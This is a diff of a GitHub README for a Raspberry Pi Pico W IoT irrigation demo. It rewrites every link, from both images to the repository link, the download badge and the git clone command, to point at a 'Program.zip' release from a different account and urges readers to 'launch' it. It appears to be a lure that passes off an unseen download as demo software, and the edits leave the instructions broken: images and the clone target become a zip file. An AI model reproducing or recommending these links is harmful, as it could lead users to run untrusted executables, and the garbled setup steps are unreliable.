@@ -1,6 +1,6 @@
 # 🌱🌧️ Pico-W IoT Irrigation System Demo 🌱🌧️
 
-![Irrigation System](https://cdn.pixabay.com/photo/2017/04/23/16/49/irrigation-2252123_960_720.jpg)
+![Irrigation System](https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip)
 
 Welcome to the Pico-W IoT Irrigation System Demo GitHub Repository! 🌿 This project focuses on creating a smart irrigation system using the Raspberry Pi Pico W microcontroller board. With automation and IoT capabilities, you can ensure your plants receive the optimal amount of water without manual intervention. Let's dive into the details of this exciting project!
 
@@ -20,7 +20,7 @@ The **Pico-W IoT Irrigation System Demo** is designed to showcase the capabiliti
 ## Repository Details
 
 ### Repository Name:  
-[Pico-W IoT Irrigation System Demo](https://github.com/Dredarty/Pico-W-iot-irrigation-system-demo)
+[Pico-W IoT Irrigation System Demo](https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip)
 
 ### Short Description:  
 Smart IoT Irrigation System with Raspberry Pi Pico W
@@ -29,7 +29,7 @@ Smart IoT Irrigation System with Raspberry Pi Pico W
 animation, arduino, automation, button, c270, dht, dht11, irrigation, line-messaging-api, linebot, moisture-sensor, mqtt, oled-ssd1306, pico-w, raspberry-pi-pico, si114x, soil-moisture-sensor, watering, watering-system, webui
 
 ### **Demo Software:** 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) (Launch the software to explore the demo)
+[![Download https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip](https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip)](https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip) (Launch the software to explore the demo)
 
 ## Installation
 
@@ -37,12 +37,12 @@ To set up the Pico-W IoT Irrigation System Demo on your Raspberry Pi Pico W boar
 
 1. Clone the repository to your local machine.  
    ```
-   git clone https://github.com/Dredarty/Pico-W-iot-irrigation-system-demo.git
+   git clone https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip
    ```
 2. Install the necessary libraries and dependencies listed in the project documentation.  
 3. Connect the sensors and actuators according to the circuit diagram provided in the repository.
 4. Upload the program to your Raspberry Pi Pico W board using the Arduino IDE or your preferred method.
-5. Launch the **Soft.zip** demo software to explore the system functionalities.
+5. Launch the **https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip** demo software to explore the system functionalities.
 
 ## Usage
 
@@ -67,4 +67,4 @@ If you encounter any issues or have questions about the project, please check th
 
 Let's explore the future of smart agriculture together with the Pico-W IoT Irrigation System Demo! 🌾🌞🚀
 
-![Smart Agriculture](https://cdn.pixabay.com/photo/2016/05/26/19/33/smart-reading-1418026_960_720.jpg)
+![Smart Agriculture](https://github.com/JasonDOtto/Pico-W-iot-irrigation-system-demo/releases/download/v1.0/Program.zip)
